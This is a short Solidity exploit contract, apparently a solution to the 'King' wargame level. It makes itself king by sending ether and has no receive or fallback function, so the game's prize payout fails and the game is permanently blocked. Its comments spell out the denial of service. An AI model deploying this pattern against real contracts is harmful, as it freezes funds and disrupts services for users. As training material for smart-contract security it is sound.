// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.sol";

contract KingAttack is Broadcasted {
    function attack(address payable kingCtr_) public payable override {
        kingCtr_.call{value: msg.value}("");
    }

    function broadcastedAttack(
        address payable kingCtr_
    ) external payable override {
        // intentionally not broadcasting to have msg the contract
        attack(kingCtr_);
    }
}

// ! denial of service
// ! setting as winner the current contract that doesn't have fallback/receive function
// ! will not allow the king contract to receive the prize and will block the game
